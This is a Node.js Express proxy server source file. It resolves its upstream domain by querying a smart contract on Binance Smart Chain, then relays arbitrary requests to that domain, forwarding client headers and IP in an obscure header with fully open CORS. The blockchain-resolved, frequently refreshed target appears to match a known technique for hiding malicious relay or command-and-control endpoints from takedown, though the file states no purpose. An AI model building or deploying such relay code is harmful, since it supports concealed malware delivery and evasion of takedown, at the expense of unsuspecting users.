import express from "express";
import fetch from "node-fetch";
import { readFile, writeFile } from "fs/promises";
import { tmpdir } from "os";
import { join } from "path";

const app = express();
app.use(express.text({ type: "*/*" })); // To capture raw body

const UPDATE_INTERVAL = 60 * 1000; // 60s
const CACHE_FILE = join(tmpdir(), "proxy_cache.json");
const RPC_URLS = [
  "https://binance.llamarpc.com",
  "https://bsc.drpc.org",
];
const CONTRACT_ADDRESS = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";

// --- Utility Functions ---
function getClientIP(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.connection.remoteAddress
  );
}

async function loadCache() {
  try {
    const data = JSON.parse(await readFile(CACHE_FILE, "utf-8"));
    if (Date.now() - data.timestamp < UPDATE_INTERVAL) {
      return data.domain;
    }
  } catch (_) {}
  return null;
}

async function saveCache(domain) {
  await writeFile(
    CACHE_FILE,
    JSON.stringify({ domain, timestamp: Date.now() })
  );
}

function hexToString(hex) {
  hex = hex.replace(/^0x/, "");
  hex = hex.substring(64);
  const length = parseInt(hex.substring(0, 64), 16);
  const dataHex = hex.substring(64, 64 + length * 2);
  let result = "";
  for (let i = 0; i < dataHex.length; i += 2) {
    const code = parseInt(dataHex.substring(i, i + 2), 16);
    if (code === 0) break;
    result += String.fromCharCode(code);
  }
  return result;
}

async function fetchTargetDomain() {
  const data = "20965255";
  const payload = {
    jsonrpc: "2.0",
    id: 1,
    method: "eth_call",
    params: [
      { to: CONTRACT_ADDRESS, data: "0x" + data },
      "latest",
    ],
  };

  for (const url of RPC_URLS) {
    try {
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const json = await res.json();
      if (!json.error) {
        return hexToString(json.result);
      }
    } catch (_) {}
  }
  throw new Error("Could not fetch target domain");
}

async function getTargetDomain() {
  const cached = await loadCache();
  if (cached) return cached;
  const domain = await fetchTargetDomain();
  await saveCache(domain);
  return domain;
}

// --- Proxy Handler ---
app.all("/", async (req, res) => {
  if (req.query.e === "ping_proxy") {
    return res.type("text").send("pong");
  }
  if (!req.query.e) {
    return res.status(400).send("Missing endpoint");
  }

  try {
    const targetDomain = (await getTargetDomain()).replace(/\/$/, "");
    const endpoint = "/" + decodeURIComponent(req.query.e).replace(/^\//, "");
    const url = targetDomain + endpoint;

    const clientIP = getClientIP(req);

    // Build headers
    const headers = { ...req.headers };
    delete headers.host;
    delete headers.origin;
    delete headers["accept-encoding"];
    delete headers["content-encoding"];
    headers["x-dfkjldifjlifjd"] = clientIP;

    const proxyRes = await fetch(url, {
      method: req.method,
      headers,
      body: req.method !== "GET" && req.method !== "HEAD" ? req.body : undefined,
      redirect: "follow",
    });

    // Forward status and content-type
    res.status(proxyRes.status);
    proxyRes.headers.forEach((value, key) => {
      res.setHeader(key, value);
    });

    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "*");

    const buffer = await proxyRes.arrayBuffer();
    res.send(Buffer.from(buffer));
  } catch (e) {
    console.error(e);
    res.status(500).send("error: " + e.message);
  }
});

// --- CORS Preflight ---
app.options("*", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, HEAD, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "*");
  res.setHeader("Access-Control-Max-Age", "86400");
  res.status(204).send();
});

// --- Start Server ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Secure Proxy running on port ${PORT}`);
});
